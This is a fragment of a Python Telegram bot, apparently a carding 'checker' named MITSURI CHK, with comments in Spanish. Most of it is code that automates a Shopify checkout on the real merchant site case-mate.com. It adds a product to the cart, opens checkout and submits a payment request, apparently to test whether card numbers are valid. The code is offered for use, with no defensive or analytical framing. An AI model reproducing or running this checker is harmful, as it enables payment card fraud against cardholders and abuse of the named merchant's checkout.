...
@Client.on_message(filters.command("he", prefixes=['.','/','!','?'], case_sensitive=False) & filters.text)
...
<b>あ MITSURI CHK あ
ESTADO: <code>ON</code>
GATEWAY: <code>HEFESTO</code>
PASARELA: <code>SHOPIFY $40.29</code>
</b>""")
...
<b>Informacion:</b> {x.get("type")} {x.get("level")} {x.get("flag")}""")
        ...
        #--------ID DEL PRODUCTO ---------#
        payload_1 = {'id': '41108925677704'}
        
        #-----------PASO N° 2 REEMPLAZAR URL ADD CART-----------#
        req1 = session.post(url=f'https://case-mate.com/cart/add.js', data=payload_1)
        time.sleep(1)
        print("</> PRODUCTO AGREGADO AL CARRIDO")
        
        #-----------PASO N° 3 REEMPLAZAR URL CHECKUOT-----------#
        req3 = session.post(url=f"https://case-mate.com/checkout/")
        ...
        payload_4 = {
            ...
            "payment_session_scope": "www.case-mate.com"
        }
        ...
        payload_5 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=payment_method&step=&s={id_}&checkout%5Bpayment_gateway%5D=48361603208&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Btotal_price%5D=4029&checkout_submitted_request_url=https%3A%2F%2Fcase-mate.com%2F34784968840%2Fcheckouts%2Fbf83f13127c8b8497bdcb9ea470ea5ac%3Fprevious_step%3Dshipping_method%26step%3Dpayment_method&checkout_submitted_page_id=b6802323-4B29-4B0E-CF55-41B1922F6954&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=759&checkout%5Bclient_details%5D%5Bbrowser_height%5D=738&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=180'
